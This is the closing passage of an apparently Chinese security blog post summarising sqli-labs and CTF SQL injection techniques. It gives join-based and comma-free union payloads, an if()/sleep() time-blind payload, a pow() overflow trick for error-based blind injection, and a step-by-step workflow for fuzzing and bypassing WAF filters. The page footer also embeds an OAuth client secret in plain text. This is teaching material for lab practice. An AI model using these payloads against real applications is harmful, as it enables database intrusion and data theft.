+<p>如果我们这里的limit被过滤了咋办？那就试试下面的几种方法：</p>
+<p>(1) group_concat(使用的最多)<br>(2) &lt;&gt;筛选(不等于)<br>(3) <strong>not in</strong><br>(4) DISTINCT</p>
+<p>上面这些都涉及到了sql基本语句，这里就不一一举例了。大家可以多在本地环境试试，加深理解</p>
+<p>4、join注入</p>
+<p><strong>payload：</strong>：</p>
+<p>1&#39; union <strong>select</strong> * <strong>from</strong> (<strong>select</strong> 1) a <strong>join</strong> (<strong>select</strong> 2) b %23</p>
+<p>优势：过滤了逗号的情况下使用</p>
+<p>下面的payload(别的博客处摘抄来的)适用于过滤了逗号和字段名的情况下使用</p>
+<p>union all<br> <strong>select</strong> * <strong>from</strong>(<br>     (<strong>select</strong> 1)a <strong>join</strong>(<br>         <strong>select</strong> F.[需要查询的字段号] <strong>from</strong>(<br>             <strong>select</strong> * <strong>from</strong> [需要查询的表有多少个字段就<strong>join</strong>多少个]<br>             <strong>union</strong><br>             <strong>select</strong> * <strong>from</strong> [需要查询的表] [<strong>limit</strong>子句]<br>         )F<em>-- 我们创建的虚拟表没有表名，因此定义一个别名，然后直接[别名].[字段号]查询数据</em><br>     )b<em>-- 同上[还差多少字段就再join多少个，以满足字段数相同的原则]</em><br> )</p>
+<p>具体的使用方法不在本文的讨论范围内，具体的使用可以看看下面的文章：</p>
+<p><a href="https://blog.csdn.net/qq_33020901/article/details/78906268" target="_blank" rel="noopener">https://blog.csdn.net/qq_33020901/article/details/78906268</a></p>
+<p>5、带!的注入</p>
+<p><strong>直接看下面的payload，适用于and、or、^被过滤的情况下使用，有时候可能也会使用到，但是具体的原理不是很明白，大家可以自行google</strong></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayvk5kgzj20qh0en76v.jpg" alt></p>
+<p>6、if盲注(合理利用条件)</p>
+<p>if盲注的基本格式：</p>
+<p><strong>if</strong>(条件,条件为真执行的语句,条件为假执行的语句)</p>
+<p>举个例子：</p>
+<p>admin&#39; <strong>if</strong>(ascii(mid(user(),1,1))=100,sleep(5),1)</p>
+<p>用好if盲注的关键是条件的输入，有一道BCTF的注入题的wp用的就是if盲注</p>
+<p>wp链接：<a href="https://www.kingkk.com/2018/04/bctf2018-love-q/" target="_blank" rel="noopener">https://www.kingkk.com/2018/04/bctf2018-love-q/</a></p>
+<p>写博客的这位大佬巧妙利用了<strong>pow函数数值溢出的特性</strong>，使得经过if判断后的条件会报错，但是不执行该语句时语法上是没问题的</p>
+<p>原理如下：</p>
+<p>mysql&gt; <strong>select if(1,1,pow(2,22222222222)); //条件为真时，返回1</strong></p>
+<p>+——————————————+</p>
+<p>| if(1,1,pow(2,22222222222)) |</p>
+<p>+——————————————+</p>
+<p>| 1 |</p>
+<p>+——————————————+</p>
+<p>1 row in set (0.00 sec)</p>
+<p>mysql&gt; <strong>select if(0,1,pow(2,22222222222)); //条件为假时，报错</strong></p>
+<p>ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(2,22222222222)&#39;</p>
+<p>像利用pow这种函数溢出的特性也不止这一个，这就需要我们靠平时的经验积累了，总之想要玩好ctf的注入题途径就是多刷题。</p>
+<h2 id="自己总结的注入流程"><a href="#自己总结的注入流程" class="headerlink" title="自己总结的注入流程"></a>自己总结的注入流程</h2><p>1、先找到注入点，id=，username=，判断GET/POST/COOKIE注入</p>
+<p>2、查看显示位，如果只有一个显示位在使用union注入是注意使用limit来限制显示</p>
+<p>3、判断字符型注入还是数字型注入（2-1，&#39;是否正常）</p>
+<p>4、输入不同值查看页面是否有变化，无变化的话可以考虑采用bool时间盲注，若有报错信息优先考虑报错注入（exp，updatexml（优先采用updatexml、extractvalue报错））</p>
+<p>5、先简单测试空格和注释符是否被替换了，id=1 1，id = 1%231（看看能否用/ /、%20、%0a、%09绕过）</p>
+<p>6、进行fuzz，看看那些被waf了</p>
+<p>7、若页面上没有显示waf过滤之类的提示（sql injection detected），就测试是否有被替换为空的字符（如：&#39;or &#39;*&#39;=&#39;、&#39; or &#39;-&#39;=&#39; ，如果页面返回正常的话，则说明该字符被替换为空）</p>
+<p>8、简单尝试双写、编码、大小写替换的方法，判断是否可以绕过</p>
+<p>9、确定注入方式（尽量把盲注放最后），union、报错注入、盲注</p>
+<p>10、先在bp中跑一遍看是否有结果</p>
+<p>11、尝试写脚本</p>
+<p>最重要的两步就是注入点并判断出注入类型，找到被过滤的函数和关键字并找到替代的函数和关键字，这就需要我们靠自己的耐心和细心还有经验的积累了。</p>
+<h1 id="其他一些不错的参考文章"><a href="#其他一些不错的参考文章" class="headerlink" title="其他一些不错的参考文章"></a>其他一些不错的参考文章</h1><p><a href="https://www.cnblogs.com/Vinson404/p/7253255.html" target="_blank" rel="noopener">SQL注入绕过技巧</a></p>
+<p><a href="https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/" target="_blank" rel="noopener">SQLi filter evasion cheat sheet</a></p>
+<p><a href="https://xz.aliyun.com/t/368" target="_blank" rel="noopener">我的WafBypass之道（SQL注入篇）</a></p>
+<p><a href="https://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">sql 盲注之正则表达式攻击</a></p>
+<p><a href="https://blog.csdn.net/qq_33020901/article/details/78906268" target="_blank" rel="noopener">mysql无逗号的注入技巧</a></p>
+<p><a href="https://github.com/H4lo/dictionary" target="_blank" rel="noopener">fuzz字典</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/02/18/sqli_lab总结/" title="sqli_lab总结">https://wh0ale.github.io/2019/02/18/sqli_lab总结/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/sql/" rel="tag"><i class="fa fa-tag"></i># sql</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/02/17/2019-2-17-NET下的权限维持/" rel="next" title=".net下的权限维持">
+                <i class="fa fa-chevron-left"></i> .net下的权限维持
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/02/19/2019-2-19-内网渗透tips②/" rel="prev" title="内网渗透tips②">
+                内网渗透tips② <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Less1"><span class="nav-number">1.</span> <span class="nav-text">Less1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less2"><span class="nav-number">2.</span> <span class="nav-text">Less2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less3"><span class="nav-number">3.</span> <span class="nav-text">Less3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less4"><span class="nav-number">4.</span> <span class="nav-text">Less4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#盲注"><span class="nav-number">5.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基于布尔-SQL-盲注-构造逻辑判断"><span class="nav-number">5.1.</span> <span class="nav-text">基于布尔 SQL 盲注----------构造逻辑判断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于报错的-SQL-盲注-构造-payload-让信息通过错误提示回显出来"><span class="nav-number">5.2.</span> <span class="nav-text">基于报错的 SQL 盲注------构造 payload 让信息通过错误提示回显出来</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于时间的-SQL-盲注-延时注入"><span class="nav-number">5.3.</span> <span class="nav-text">基于时间的 SQL 盲注----------延时注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less5"><span class="nav-number">6.</span> <span class="nav-text">Less5</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#布尔盲注"><span class="nav-number">6.1.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#报错注入"><span class="nav-number">6.2.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#延时注入"><span class="nav-number">6.3.</span> <span class="nav-text">延时注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less10-post注入"><span class="nav-number">7.</span> <span class="nav-text">Less10 post注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#增删改函数介绍"><span class="nav-number">8.</span> <span class="nav-text">增删改函数介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#增"><span class="nav-number">8.1.</span> <span class="nav-text">增</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#删"><span class="nav-number">8.2.</span> <span class="nav-text">删</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#改"><span class="nav-number">8.3.</span> <span class="nav-text">改</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less17-密码注入"><span class="nav-number">9.</span> <span class="nav-text">Less17 密码注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#防注入函数介绍"><span class="nav-number">10.</span> <span class="nav-text">防注入函数介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#addslashes"><span class="nav-number">10.1.</span> <span class="nav-text">addslashes()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stripslashes"><span class="nav-number">10.2.</span> <span class="nav-text">stripslashes()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql-real-escape-string"><span class="nav-number">10.3.</span> <span class="nav-text">mysql_real_escape_string()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTTP-头部介绍"><span class="nav-number">11.</span> <span class="nav-text">HTTP 头部介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less18-http头注入"><span class="nav-number">12.</span> <span class="nav-text">Less18 http头注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less23-过滤注释符"><span class="nav-number">13.</span> <span class="nav-text">Less23 过滤注释符</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less24-二次排序注入"><span class="nav-number">14.</span> <span class="nav-text">Less24 二次排序注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less25-过滤or-and"><span class="nav-number">15.</span> <span class="nav-text">Less25 过滤or and</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less26-过滤空格"><span class="nav-number">16.</span> <span class="nav-text">Less26 过滤空格</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less27-大小写绕过"><span class="nav-number">17.</span> <span class="nav-text">Less27 大小写绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#服务器（两层）架构-http-参数污染"><span class="nav-number">18.</span> <span class="nav-text">服务器（两层）架构 http 参数污染</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#宽字节注入"><span class="nav-number">19.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less32-宽字节绕过（GET-POST）"><span class="nav-number">20.</span> <span class="nav-text">Less32 宽字节绕过（GET POST）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Addslashes"><span class="nav-number">20.1.</span> <span class="nav-text">Addslashes()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql-real-escape-string-1"><span class="nav-number">20.2.</span> <span class="nav-text">mysql_real_escape_string()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stacked-injection堆叠注入"><span class="nav-number">21.</span> <span class="nav-text">stacked injection堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#堆叠注入的局限性"><span class="nav-number">21.1.</span> <span class="nav-text">堆叠注入的局限性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#各个数据库实例介绍"><span class="nav-number">21.2.</span> <span class="nav-text">各个数据库实例介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Mysql-数据库"><span class="nav-number">21.2.1.</span> <span class="nav-text">Mysql 数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sql-server-数据库"><span class="nav-number">21.2.2.</span> <span class="nav-text">Sql server 数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle-数据库"><span class="nav-number">21.2.3.</span> <span class="nav-text">Oracle 数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Postgresql-数据库"><span class="nav-number">21.2.4.</span> <span class="nav-text">Postgresql 数据库</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less38堆叠注入-GET-POST"><span class="nav-number">22.</span> <span class="nav-text">Less38堆叠注入(GET POST)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GET"><span class="nav-number">22.1.</span> <span class="nav-text">GET</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST"><span class="nav-number">22.2.</span> <span class="nav-text">POST</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less43"><span class="nav-number">23.</span> <span class="nav-text">less43</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-46-order-by后的-injection"><span class="nav-number">24.</span> <span class="nav-text">Less-46 order by后的 injection</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-50-order-by-stackedinjection"><span class="nav-number">25.</span> <span class="nav-text">Less-50 order by stackedinjection</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less54-challenges"><span class="nav-number">26.</span> <span class="nav-text">Less54 challenges</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less58"><span class="nav-number">27.</span> <span class="nav-text">Less58</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less62"><span class="nav-number">28.</span> <span class="nav-text">Less62</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF中几种通用的sql盲注手法和注入的一些tips"><span class="nav-number">29.</span> <span class="nav-text">CTF中几种通用的sql盲注手法和注入的一些tips</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XOR注入"><span class="nav-number">29.1.</span> <span class="nav-text">XOR注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#regexp注入"><span class="nav-number">29.2.</span> <span class="nav-text">regexp注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#order-by盲注"><span class="nav-number">29.3.</span> <span class="nav-text">order by盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实例讲解"><span class="nav-number">29.4.</span> <span class="nav-text">实例讲解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他的一些小tips"><span class="nav-number">29.5.</span> <span class="nav-text">其他的一些小tips</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#自己总结的注入流程"><span class="nav-number">29.6.</span> <span class="nav-text">自己总结的注入流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#其他一些不错的参考文章"><span class="nav-number">30.</span> <span class="nav-text">其他一些不错的参考文章</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
